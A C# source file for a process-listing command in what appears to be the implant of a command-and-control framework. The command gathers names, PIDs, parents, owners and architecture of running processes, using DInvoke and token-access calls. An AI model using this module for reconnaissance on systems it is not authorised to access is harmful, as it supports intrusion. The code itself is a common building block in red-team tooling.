using Agent.Models;
using Shared;
using Shared.ResultObjects;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WinAPI.Data.AdvApi;
using WinAPI.DInvoke;
using static WinAPI.DInvoke.Data.Native;

namespace Agent.Commands
{

   
    public class ListProcessCommand : AgentCommand
    {
        public override CommandId Command => CommandId.ListProcess;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            var list = new List<ListProcessResult>();
            string filter = null;
            if (task.HasParameter(ParameterId.Path))
            {
                filter = task.GetParameter<string>(ParameterId.Path); ;
            }

            var processes = Process.GetProcesses();
            if (!string.IsNullOrEmpty(filter))
                processes = processes.Where(p => p.ProcessName.ToLower().Contains(filter.ToLower())).ToArray();

            foreach (var process in processes)
            {
                var res = new ListProcessResult()
                {
                    Name = process.ProcessName,
                    Id = process.Id,
                    ParentId = GetProcessParent(process),
                    SessionId = process.SessionId,
                    ProcessPath = GetProcessPath(process),
                    Owner = GetProcessOwner(process),
                    Arch = GetProcessArch(process),
                };

                list.Add(res);
            }

            context.Objects(list);
        }

        private string GetProcessPath(Process proc)
        {
            try
            {
                return proc.MainModule.FileName;
            }
            catch
            {
                return "-";
            }
        }

        public string GetProcessOwner(Process proc)
        {
            var hToken = IntPtr.Zero;
            try
            {
                if (!Advapi.OpenProcessToken(proc.Handle, DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
                    return "-";

                var identity = new WindowsIdentity(hToken);
                return identity.Name;
            }
            catch
            {
                return "-";
            }
            finally
            {
                Kernel32.CloseHandle(hToken);
            }
        }

        public static bool Is64bitProcess(Process proc)
        {
            try
            {
                var is64BitOS = Environment.Is64BitOperatingSystem;

                if (!is64BitOS)
                    return false;


                if (!WinAPI.PInvoke.Kernel32.IsWow64Process(proc.Handle, out var isWow64))
                    return false;

                if (isWow64)
                    return false;

                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }

        public string GetProcessArch(Process proc)
        {
            try
            {
                var is64BitOS = Environment.Is64BitOperatingSystem;

                if (!is64BitOS)
                    return "x86";


                if (!WinAPI.PInvoke.Kernel32.IsWow64Process(proc.Handle, out var isWow64))
                    return "-";

                if (isWow64)
                    return "x86";

                return "x64";
            }
            catch(Exception e)
            {
                return "-";
            }
        }

        public static PROCESS_BASIC_INFORMATION QueryProcessBasicInformation(IntPtr hProcess)
        {
            WinAPI.DInvoke.Native.NtQueryInformationProcess(
                hProcess,
                WinAPI.DInvoke.Data.Native.PROCESSINFOCLASS.ProcessBasicInformation,
                out var pProcInfo);

            return (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pProcInfo, typeof(PROCESS_BASIC_INFORMATION));
        }

        private static int GetProcessParent(Process process)
        {
            try
            {
                var pbi = QueryProcessBasicInformation(process.Handle);
                return pbi.InheritedFromUniqueProcessId;
            }
            catch
            {
                return 0;
            }
        }

        /*private int GetParentId(int processId)
        {
            try
            {
                var query = string.Format("SELECT ParentProcessId FROM Win32_Process WHERE ProcessId = {0}", processId);
                var search = new ManagementObjectSearcher("root\\CIMV2", query);
                var results = search.Get().GetEnumerator();
                results.MoveNext();
                var queryObj = results.Current;
                var parentId = (uint)queryObj["ParentProcessId"];
                return (int)parentId;
            }
            catch
            {
                return 0;
            }
        }*/



    }
}
